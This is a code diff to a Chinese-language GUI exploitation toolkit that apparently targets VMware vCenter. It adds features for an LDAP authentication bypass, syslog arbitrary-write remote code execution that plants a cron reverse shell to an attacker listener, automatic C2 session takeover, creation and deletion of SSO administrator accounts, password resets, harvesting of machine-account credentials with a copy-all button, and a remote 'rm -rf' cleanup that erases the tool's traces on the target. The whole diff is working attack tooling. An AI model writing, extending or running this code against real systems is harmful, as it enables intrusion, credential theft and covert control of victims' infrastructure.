@@ -26,7 +26,8 @@ from .util import rand_name
 from .recon import probe_target
 from .srp59309 import srp_bypass_bind
 from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
-                      op_modify, collect_search, parse_ldap_result, has_srp)
+                      op_modify, op_delete, collect_search,
+                      parse_ldap_result, has_srp)
 from .syslog59310 import (build_rfc5424, check_write, write_file, plant_cron,
                           rce_readback, drop_webshell, traversal_app,
                           traversal_host, plant_revshell)
@@ -94,6 +95,7 @@ class ToolApp:
         self.creds = {}              # 凭据收集
         self.stop_flag = threading.Event()
         self.c2m = SessionManager(log=self.log)
+        self.c2m.on_new_session = self._on_new_session
         self.cur_sess = None
         self._build_style()
         self._build_ui()
@@ -106,7 +108,8 @@ class ToolApp:
                         ("<F5>", lambda e: self._scan_all()),
                         ("<F6>", self._k_f6),
                         ("<F7>", self._k_f7),
-                        ("<Escape>", lambda e: self.stop_flag.set()),
+                        ("<F9>", self._k_f9),
+                        ("<Escape>", lambda e: self._cancel()),
                         ("<Control-l>", lambda e: self._log_clear()),
                         ("<Control-s>", lambda e: self._log_save())):
             self.root.bind(seq, fn)
@@ -293,11 +296,8 @@ class ToolApp:
         f = ttk.Frame(parent)
         f.grid(row=row, column=0, columnspan=12, sticky="ew", pady=(0, 4))
         ttk.Label(f, text="目标:", style="Muted.TLabel").pack(side="left")
-        tv = tk.StringVar(value=self.cur_target.get())
-        ttk.Entry(f, textvariable=tv, width=26).pack(side="left", padx=4)
-        ttk.Button(f, text="取当前目标", width=10,
-                   command=lambda: tv.set(self.cur_target.get())).pack(side="left", padx=2)
-        return f, tv
+        ttk.Entry(f, textvariable=self.cur_target, width=26).pack(side="left", padx=4)
+        return f, self.cur_target
 
     def _wrap_lbl(self, parent, text):
         """随面板宽度自动换行的说明标签（小窗口下不再右缘截断）。"""
@@ -347,6 +347,13 @@ class ToolApp:
         self._chain_run()
 
     def run_bg(self, fn, name="任务"):
+        if getattr(self, "_task_running", False):
+            self.log("[!] 已有任务执行中（%s），请等待或按 Esc 取消" %
+                     getattr(self, "_task_name", "?"), "!")
+            return
+        self._task_running = True
+        self._task_name = name
+
         def wrap():
             self._busy(name + "执行中…")
             try:
@@ -356,9 +363,20 @@ class ToolApp:
                 tb = traceback.format_exc()
                 self.log("[!] %s 异常: %r" % (name, e), "!")
                 logutil.write("!", "%s 完整堆栈:\n%s" % (name, tb))
+                self.root.after(0, lambda: self.status_var.set(
+                    "● 上次任务失败（详见日志）"))
             finally:
+                self._task_running = False
                 self._idle()
         threading.Thread(target=wrap, daemon=True).start()
+
+
+    def _k_f9(self, _e):
+        self.nb.select(self.tab_vops)
+        self._vv_refresh()
+    def _cancel(self):
+        self.stop_flag.set()
+        self.log("[!] 已请求取消，等待当前步骤结束…", "!")
 
     def record(self, typ, target, detail, cleanup):
         self.actions.append({"time": time.strftime("%m-%d %H:%M:%S"), "type": typ,
@@ -379,7 +397,9 @@ class ToolApp:
         top.grid(row=0, column=0, sticky="ew", pady=4)
         ttk.Label(top, text="目标:").pack(side="left")
         self.tgt_input = tk.StringVar()
-        ttk.Entry(top, textvariable=self.tgt_input, width=20).pack(side="left", padx=4)
+        _e_tgt = ttk.Entry(top, textvariable=self.tgt_input, width=20)
+        _e_tgt.pack(side="left", padx=4)
+        _e_tgt.bind("<Return>", lambda e: self._tgt_add())
         ttk.Button(top, text="添加", command=self._tgt_add).pack(side="left")
         ttk.Button(top, text="导入", command=self._tgt_import).pack(side="left", padx=2)
         ttk.Button(top, text="删除", command=self._tgt_del).pack(side="left")
@@ -470,7 +490,12 @@ class ToolApp:
 
         def work():
             self.log("[*] 批量指纹开始：%d 个目标（仅探测）" % len(hosts), "i")
-            for h in hosts:
+            self.stop_flag.clear()
+            for idx, h in enumerate(hosts, 1):
+                if self.stop_flag.is_set():
+                    self.log("[!] 批量指纹已中止", "!")
+                    return
+                self.log("[*] (%d/%d) %s …" % (idx, len(hosts), h), "m")
                 try:
                     r = probe_target(h, proxy=proxy, log=self.log)
                 except Exception as e:
@@ -568,8 +593,8 @@ class ToolApp:
         ttk.Label(wf, text="写入向量: APP-NAME（默认）或 HOSTNAME").grid(
             row=2, column=0, columnspan=2, sticky="w", padx=4)
         self.v510_vec = tk.StringVar(value="app")
-        ttk.Combobox(wf, textvariable=self.v510_vec, values=["app", "host"],
-                     width=6, state="readonly").grid(row=3, column=0, sticky="w", padx=4)
+        ttk.Combobox(wf, textvariable=self.v510_vec, values=["APP-NAME", "HOSTNAME"],
+                     width=10, state="readonly").grid(row=3, column=0, sticky="w", padx=4)
         ttk.Label(wf, text="内容:", style="Muted.TLabel").grid(
             row=4, column=0, columnspan=2, sticky="w", padx=4)
         self.v510_wtext = tk.Text(wf, height=4, bg=COLORS["logbg"], fg=COLORS["fg"],
@@ -594,7 +619,7 @@ class ToolApp:
                    command=self._b310_rce_readback).pack(side="left")
         ttk.Button(bb, text="仅植入（输出到 /tmp）",
                    command=self._b310_rce_plain).pack(side="left", padx=6)
-        ttk.Button(bb, text="取消 [Esc]", command=self.stop_flag.set).pack(side="left")
+        ttk.Button(bb, text="取消 [Esc]", command=self._cancel).pack(side="left")
         self.v510_out = tk.Text(right, height=7, bg=COLORS["logbg"], fg=COLORS["fg"],
                                 relief="flat", highlightthickness=1,
                                 highlightbackground=COLORS["border"],
@@ -679,8 +704,9 @@ class ToolApp:
         content = self.v510_wtext.get("1.0", "end").strip()
 
         def work():
-            written, pkt = write_file(host, port, dest, content,
-                                      vector=self.v510_vec.get(), tcp=tcp, tls=tls)
+            vec = "app" if self.v510_vec.get().startswith("APP") else "host"
+            written, pkt = write_file(host, port, dest, content, vector=vec,
+                                      tcp=tcp, tls=tls)
             self.log("[+] 已发送写入 → 预期文件 %s" % written, "+")
             self.log("[d] %r" % pkt, "d")
             self.record("59310-任意写", host, written, "rm -f %s" % written)
@@ -754,9 +780,21 @@ class ToolApp:
     def _b310_revshell(self):
         host, port, tcp, tls = self._510_net()
         lhost = self.v510_lhost.get().strip()
-        if not host or not lhost:
-            messagebox.showwarning("提示", "需要目标与 LHost")
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
             return
+        if not lhost:
+            import socket as _s
+            try:
+                _t = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
+                _t.connect((host, 514))
+                lhost = _t.getsockname()[0]
+                _t.close()
+                self.v510_lhost.set(lhost)
+                self.log("[i] LHost 自动探测: %s" % lhost, "m")
+            except OSError:
+                messagebox.showwarning("提示", "需要 LHost（自动探测失败，请手填）")
+                return
         try:
             lport = int(self.v510_lport.get() or 4444)
         except ValueError:
@@ -770,6 +808,7 @@ class ToolApp:
             self.log("[+] 已植入反弹 %s:%d → %s" % (lhost, lport, planted), "+")
             self.record("59310-反弹植入", host, "%s:%d" % (lhost, lport),
                         "rm -f /etc/cron.d/cve59310*-syslog.log")
+            self.root.after(0, lambda: self.shell_port.set(str(lport)))
             self.root.after(0, lambda: self._c2_add_listener(lport))
             self.root.after(0, lambda: self.nb.select(self.tab_shell))
             self.log("[i] 已切换到 ④ 页并请求监听 %d；crond 约 60s 触发回连" % lport, "m")
@@ -848,8 +887,12 @@ class ToolApp:
         self.v590_tls = tk.BooleanVar(value=False)
         self.v590_policy = tk.StringVar(value="auto")
         ttk.Label(pf, text="端口:").grid(row=0, column=0, padx=4)
-        ttk.Combobox(pf, textvariable=self.v590_port, values=["389", "636", "2020"],
-                     width=6, state="readonly").grid(row=0, column=1)
+        _port_cb = ttk.Combobox(pf, textvariable=self.v590_port,
+                                values=["389", "636", "2020"], width=6,
+                                state="readonly")
+        _port_cb.grid(row=0, column=1)
+        _port_cb.bind("<<ComboboxSelected>>",
+                      lambda e: self.v590_tls.set(self.v590_port.get() == "636"))
         ttk.Checkbutton(pf, text="TLS (LDAPS)",
                         variable=self.v590_tls).grid(row=0, column=2, columnspan=2)
         ttk.Label(pf, text="安全层:").grid(row=0, column=4, padx=(10, 2))
@@ -916,11 +959,18 @@ class ToolApp:
             row=2, column=1, columnspan=2, sticky="ew", padx=2)
         ttk.Label(af, text="新密码").grid(row=2, column=3, padx=(6, 2))
         self.v590_rstpass = tk.StringVar(value=rand_name(12))
-        ttk.Entry(af, textvariable=self.v590_rstpass, width=11).grid(
+        ttk.Entry(af, textvariable=self.v590_rstpass, width=14).grid(
             row=2, column=4, padx=(0, 4))
         ttk.Button(af, text="重置该账户密码（ldapmodify replace）",
                    style="Danger.TButton", command=self._b309_resetpw).grid(
             row=3, column=0, columnspan=5, sticky="we", padx=4, pady=4)
+        ttk.Label(af, text="删除 DN").grid(row=4, column=0, padx=4, sticky="w")
+        self.v590_delentry = tk.StringVar()
+        ttk.Entry(af, textvariable=self.v590_delentry, width=24).grid(
+            row=4, column=1, columnspan=3, sticky="ew", padx=2)
+        ttk.Button(af, text="删除该 DN（ldapdelete）", style="Danger.TButton",
+                   command=self._b309_delete).grid(
+            row=5, column=0, columnspan=5, sticky="we", padx=4, pady=(2, 4))
 
         nf = ttk.LabelFrame(right, text="说明")
         nf.pack(fill="x", pady=4)
@@ -980,8 +1030,7 @@ class ToolApp:
                 else:
                     self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）",
                              "!")
-                if ncs and not self.v590_cbase.get():
-                    self.v590_cbase.set(ncs[0])
+                self.root.after(0, lambda ncs=ncs: self.v590_cbase.set(ncs[0]))
             self.root.after(0, _show)
         self.run_bg(work, "SRP探测")
 
@@ -1131,8 +1180,31 @@ class ToolApp:
                 self.log("[+] %s 已加入 SSO Administrators" % user, "+")
                 self.log("[i] 登录: https://%s/ui  用户 %s / %s" % (host, upn, pw), "+")
             self.record("59309-创建管理员", host, udn, "（清理）ldapdelete：%s" % udn)
-            self.creds["SSO新增账户@%s" % host] = "%s / %s" % (upn, pw)
+            self._add_cred("SSO新增账户@%s" % host, "%s / %s" % (upn, pw))
         self.run_bg(work, "创建管理员")
+
+    def _b309_delete(self):
+        dn = self.v590_delentry.get().strip()
+        if not dn:
+            messagebox.showwarning("提示", "输入要删除的账户 DN")
+            return
+        if not messagebox.askyesno("二次确认", "将从 SSO 目录删除：\n%s\n继续？" % dn):
+            return
+
+        def work():
+            conn, host = self._309_conn()
+            if conn is None:
+                return
+            conn.send_op(op_delete(dn))
+            _i, _t, val = conn.recv_op()
+            code, diag = parse_ldap_result(val)
+            if code == 0:
+                self.log("[+] 已删除: %s" % dn, "+")
+                self.record("59309-删除账户", host, dn, "（已删除）")
+            else:
+                self.log("[!] 删除失败 code=%s %s" %
+                         (code, diag.decode("utf-8", "replace")), "!")
+        self.run_bg(work, "删除账户")
 
     def _b309_resetpw(self):
         def work():
@@ -1146,7 +1218,7 @@ class ToolApp:
             code, diag = parse_ldap_result(val)
             if code == 0:
                 self.log("[+] 密码已重置: %s" % dn, "+")
-                self.creds["SSO重置@%s:%s" % (host, dn)] = pw
+                self._add_cred("SSO重置@%s:%s" % (host, dn), pw)
                 self.record("59309-重置密码", host, dn, "（请自行恢复原密码）")
             else:
                 self.log("[!] 重置失败 code=%s %s" %
@@ -1202,8 +1274,7 @@ class ToolApp:
                 return
             base = dse["namingContexts"][0] if dse["namingContexts"] else \
                 "dc=vsphere,dc=local"
-            self.root.after(0, lambda: self.v590_cbase.set(base)
-                            if not self.v590_cbase.get() else None)
+            self.root.after(0, lambda b=base: self.v590_cbase.set(b))
             try:
                 conn = connect_ldap(host, port, tls, 8)
             except Exception as e:
@@ -1342,6 +1413,17 @@ class ToolApp:
             pass
         self.root.after(200, self._poll_term)
 
+    def _on_new_session(self, sess):
+        # 新会话自动接管：切 ④、置当前会话（表由 _poll_sessions 刷新）
+        s_id, s_addr = sess.id, sess.addr
+
+        def go():
+            self.nb.select(self.tab_shell)
+            self.cur_sess = sess
+            self._term_append("== 已自动接管会话 #%d (%s) ==" % (s_id, s_addr))
+            self.log("[i] 已自动接管会话 #%d（%s）" % (s_id, s_addr), "m")
+        self.root.after(0, go)
+
     def _poll_sessions(self):
         try:
             have = {int(i) for i in self.sess_tree.get_children()}
@@ -1400,7 +1482,7 @@ class ToolApp:
         cmd = self.shell_cmd.get()
         s = self.cur_sess or self._c2_selected()
         if not s:
-            self.log("[!] 无会话（先监听并等回连，双击会话行）", "!")
+            self._term_append("[!] 无会话：先启动监听并等待回连，双击左侧会话行接管")
             return
         self.shell_cmd.set("")
         try:
@@ -1476,19 +1558,47 @@ class ToolApp:
         cf = ttk.LabelFrame(f, text="自定义命令（单行，输出经 VAMI 回显取回）")
         cf.grid(row=2, column=0, sticky="ew", pady=4)
         self.postex_cmd = tk.StringVar()
-        ttk.Entry(cf, textvariable=self.postex_cmd).pack(side="left", fill="x",
-                                                         expand=True, padx=4)
+        _e_px = ttk.Entry(cf, textvariable=self.postex_cmd)
+        _e_px.pack(side="left", fill="x", expand=True, padx=4)
+        _e_px.bind("<Return>", lambda e: self._postex("cmd"))
         ttk.Button(cf, text="执行", style="Acc.TButton",
                    command=lambda: self._postex("cmd")).pack(side="left")
 
         of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
         of.grid(row=3, column=0, sticky="nsew", pady=4)
-        self.postex_out = tk.Text(of, bg=COLORS["logbg"], fg=COLORS["fg"],
+        credf = ttk.Frame(of)
+        credf.pack(fill="x", padx=4, pady=(4, 0))
+        ttk.Label(credf, text="已收集凭据:", style="Muted.TLabel").pack(side="left")
+        ttk.Button(credf, text="复制全部", width=10,
+                   command=self._creds_copy).pack(side="right")
+        self.cred_tree = ttk.Treeview(of, columns=("key", "value"),
+                                      show="headings", height=4)
+        for c, t, w in (("key", "来源", 170), ("value", "凭据", 340)):
+            self.cred_tree.heading(c, text=t)
+            self.cred_tree.column(c, width=w, anchor="w")
+        self.cred_tree.pack(fill="x", padx=4, pady=(0, 4))
+        self.postex_out = tk.Text(of, height=6, bg=COLORS["logbg"], fg=COLORS["fg"],
                                   relief="flat", font=(self.font_family, 9))
         self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)
         ttk.Label(of, text="机器账户可用于直连 LDAPS 做任意 LDAP 操作，或作为横向凭据。"
                            "（安全边界：不含 ESXi 破坏/勒索与隐蔽持久化功能）",
                   style="Muted.TLabel").pack(anchor="w", padx=6)
+
+    def _add_cred(self, key, value):
+        """凭据统一入口：会话记录 + ⑤ 页面板同步。"""
+        self.creds[key] = value
+        if hasattr(self, "cred_tree"):
+            self.root.after(0, lambda: self.cred_tree.insert(
+                "", "end", values=(key, value)))
+
+    def _creds_copy(self):
+        if not self.creds:
+            messagebox.showinfo("提示", "尚无已收集凭据")
+            return
+        self.root.clipboard_clear()
+        self.root.clipboard_append("\n".join(
+            "%s = %s" % (k, v) for k, v in self.creds.items()))
+        self.log("[+] 已复制 %d 条凭据" % len(self.creds), "+")
 
     def _postex(self, key):
         host = self.vpx_host.get().strip().split(":")[0]
@@ -1504,14 +1614,20 @@ class ToolApp:
         else:
             name, cmd = POSTEX_ACTIONS[key]
         tag = rand_name(6)
-        vport = int(self.v510_vport.get() or 5480)
+        try:
+            vport = int(self.v510_vport.get() or 5480)
+            port = int(self.v510_port.get() or 514)
+        except ValueError:
+            messagebox.showwarning("提示", "② 页端口设置需为数字")
+            return
+        self.stop_flag.clear()
         proxy = self.http_proxy.get().strip() or None
+        tcp = self.v510_proto.get() in ("TCP", "TLS")
+        tls = self.v510_proto.get() == "TLS"
 
         def work():
             self.log("[*] 后渗透[%s] → %s : %s" % (name, host, cmd), "i")
-            ok, text = rce_readback(host, int(self.v510_port.get() or 514), cmd, tag,
-                                    tcp=self.v510_proto.get() in ("TCP", "TLS"),
-                                    tls=self.v510_proto.get() == "TLS",
+            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                     vami_port=vport, proxy=proxy,
                                     poll_cb=lambda s: self.log(s, "m"),
                                     stop_flag=self.stop_flag)
@@ -1525,12 +1641,13 @@ class ToolApp:
                 self.postex_out.insert("1.0", text)
             self.root.after(0, _show)
             if key == "machine-creds":
-                self.creds["机器账户@%s" % host] = text.strip()[:600]
+                self._add_cred("机器账户@%s" % host, text.strip()[:600])
                 self.log("[+] 机器账户凭据已存入会话记录", "+")
             if key == "sso-domain" and text.strip():
                 dom = text.strip().splitlines()[0]
-                self.log("[i] 可将 ③ 页 Base DN 更新为 dc=%s" %
-                         ",dc=".join(dom.split(".")), "m")
+                self.root.after(0, lambda d=dom: self.v590_cbase.set(
+                    "dc=" + ",dc=".join(d.split("."))))
+                self.log("[i] ③ 页 Base DN 已自动填充为 %s" % dom, "m")
             self.record("59310-后渗透", host, name,
                         "rm -f /opt/vmware/share/htdocs/r%s.txt "
                         "/etc/cron.d/cve59310%s*" % (tag, tag))
@@ -1588,7 +1705,7 @@ class ToolApp:
                    command=self._chain_run).pack(fill="x", padx=4, pady=4)
         ttk.Button(bf, text="导出测试报告（Markdown）", command=self._chain_report).pack(
             fill="x", padx=4, pady=2)
-        ttk.Button(bf, text="取消", command=self.stop_flag.set).pack(
+        ttk.Button(bf, text="取消 [Esc]", command=self._cancel).pack(
             fill="x", padx=4, pady=2)
         nf = ttk.LabelFrame(left, text="流程")
         nf.pack(fill="both", expand=True, pady=4)
@@ -1647,14 +1764,16 @@ class ToolApp:
                 self.vch_out.delete("1.0", "end")
                 self.vch_out.insert("1.0", card)
             self.root.after(0, _show)
-            if r.ok:
+            if r.upn:
                 self.record("chain-管理员账户", host, r.upn,
                             "ldapdelete '%s'" % r.udn)
-                self.creds["SSO管理员@%s" % host] = "%s / %s" % (r.upn, r.password)
+                self._add_cred("SSO管理员@%s" % host, "%s / %s" % (r.upn, r.password))
+            if r.ok:
                 self.log("[+] 一键打通完成（%s）" % r.via, "+")
 
                 def _prefill(upn=r.upn, pw=r.password):
-                    # ⑨ vSphere 管理页自动预填交付账户
+                    # ⑨ vSphere 管理页自动预填交付账户（旧连接必须失效）
+                    self._vv_conn = None
                     self.vv_host.set(host)
                     self.vv_user.set(upn)
                     self.vv_pass.set(pw)
@@ -1704,7 +1823,7 @@ class ToolApp:
         self.vv_pass = tk.StringVar()
         ttk.Entry(lf, textvariable=self.vv_pass, width=18, show="*").pack(
             side="left", padx=2)
-        ttk.Button(lf, text="登录并刷新", style="Acc.TButton",
+        ttk.Button(lf, text="登录并刷新 [F9]", style="Acc.TButton",
                    command=self._vv_refresh).pack(side="left", padx=6)
 
         vf = ttk.LabelFrame(left, text="虚拟机清单（只读）")
@@ -1805,8 +1924,11 @@ class ToolApp:
     def _vv_client(self, host, user, password):
         """返回已登录连接；未登录则现场登录（仅后台线程调用）。"""
         from .mgmt import VCenterRest, MgmtError
-        if self._vv_conn is not None:
+        if self._vv_conn is not None and \
+                self._vv_conn.host == host and \
+                getattr(self._vv_conn, "_user", "") == user:
             return self._vv_conn
+        self._vv_conn = None
         return self._vv_connect(host, user, password)
 
     def _vv_connect(self, host, user, password):
@@ -1817,17 +1939,6 @@ class ToolApp:
         c.login(user, password)
         self._vv_conn = c
         return c
-
-    def _vv_reconnect_on_auth_error(self, host, user, password, e):
-        """401/会话失效 → 丢弃缓存连接重登一次；非认证错误返回 None。"""
-        from .mgmt import MgmtError
-        s = str(e)
-        if "401" in s or "认证失败" in s:
-            self._vv_conn = None
-            return self._vv_connect(host, user, password)
-        if isinstance(e, MgmtError):
-            raise e
-        raise e
 
     def _vv_creds(self):
         return (self.vv_host.get().strip().split(":")[0],
@@ -2041,7 +2152,7 @@ class ToolApp:
                    command=self._clean_gen).pack(side="left")
         ttk.Button(top, text="复制到剪贴板",
                    command=self._clean_copy).pack(side="left", padx=6)
-        ttk.Button(top, text="一键清除目标残留（经 RCE）",
+        ttk.Button(top, text="一键清除目标残留（经 RCE）", style="Danger.TButton",
                    command=self._clean_remote).pack(side="left", padx=6)
         ttk.Label(top, text="每个利用动作发生时自动登记到此页", style="Muted.TLabel").pack(
             side="left", padx=10)
@@ -2049,12 +2160,15 @@ class ToolApp:
         awf = ttk.LabelFrame(f, text="本会话已登记动作")
         awf.grid(row=1, column=0, sticky="ew", pady=4)
         self.act_tree = ttk.Treeview(awf, columns=("time", "type", "target", "detail"),
-                                     show="headings", height=5)
+                                     show="headings", height=6)
+        _as = ttk.Scrollbar(awf, orient="vertical", command=self.act_tree.yview)
+        self.act_tree.configure(yscrollcommand=_as.set)
         for c, t, w in (("time", "时间", 100), ("type", "动作", 130),
                         ("target", "目标", 120), ("detail", "详情", 560)):
             self.act_tree.heading(c, text=t)
             self.act_tree.column(c, width=w, anchor="w")
-        self.act_tree.pack(fill="x", padx=4, pady=4)
+        self.act_tree.pack(side="left", fill="x", padx=4, pady=4)
+        _as.pack(side="right", fill="y")
 
         self.clean_txt = tk.Text(f, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  relief="flat", highlightthickness=1,
@@ -2082,6 +2196,10 @@ class ToolApp:
         tcp = self.v510_proto.get() in ("TCP", "TLS")
         tls = self.v510_proto.get() == "TLS"
         proxy = self.http_proxy.get().strip() or None
+        if not messagebox.askyesno(
+                "二次确认", "将通过 RCE 在目标上执行清理命令：\n"
+                "rm -rf /etc/cron.d/cve59310* 等全部本工具落点。\n继续？"):
+            return
         cmd = ("rm -rf /etc/cron.d/cve59310* /tmp/cve59310_* /tmp/cve59310_check_* "
                "/tmp/ws*-syslog.log /opt/vmware/share/htdocs/r*.txt 2>/dev/null; "
                "echo '--- /etc/cron.d/ after cleanup ---'; ls -la /etc/cron.d/ | head -20")
